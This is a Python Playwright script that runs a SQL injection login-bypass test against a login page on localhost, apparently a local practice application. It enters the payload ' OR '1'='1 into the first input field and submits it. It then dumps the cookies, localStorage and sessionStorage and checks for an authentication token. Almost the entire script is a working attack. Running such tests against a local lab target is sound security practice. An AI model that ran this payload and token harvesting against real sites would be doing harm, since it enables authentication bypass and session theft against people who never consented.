from playwright.sync_api import sync_playwright

URL = "http://localhost:3000/#/login"
PAYLOAD = "' OR '1'='1"


with sync_playwright() as p:

    browser = p.chromium.launch(headless=False)

    context = browser.new_context()

    page = context.new_page()

    page.goto(
        URL,
        wait_until="domcontentloaded"
    )

    print("\nLOGIN PAGE")
    print("=" * 40)

    inputs = page.locator(
        "input[type='text'], "
        "input[type='email'], "
        "input[type='search'], "
        "input:not([type]), "
        "textarea"
    )

    print("Inputs:", inputs.count())

    for i in range(inputs.count()):
        field = inputs.nth(i)

        print(
            i,
            field.get_attribute("name"),
            field.get_attribute("type")
        )

    field = inputs.nth(0)

    print("\nTESTING SQLi PAYLOAD")
    print("=" * 40)
    print(PAYLOAD)

    field.fill(PAYLOAD)

    field.press("Enter")

    page.wait_for_timeout(2000)

    print("\nAFTER SQLi")
    print("=" * 40)

    print("URL:", page.url)

    cookies = context.cookies()

    print("\nCOOKIES:")

    for cookie in cookies:
        print(
            cookie["name"],
            "=",
            cookie["value"][:30] + "..."
            if len(cookie["value"]) > 30
            else cookie["value"]
        )

    local_storage = page.evaluate(
        "Object.fromEntries(Object.entries(localStorage))"
    )

    session_storage = page.evaluate(
        "Object.fromEntries(Object.entries(sessionStorage))"
    )

    print("\nLOCAL STORAGE:")
    print(local_storage)

    print("\nSESSION STORAGE:")
    print(session_storage)

    print("\nTOKEN COOKIE:")
    print(
        any(
            cookie["name"] == "token"
            for cookie in cookies
        )
    )

    print("\nTOKEN LOCALSTORAGE:")
    print(
        "token" in local_storage
    )

    input("\nPress ENTER to close...")

    browser.close()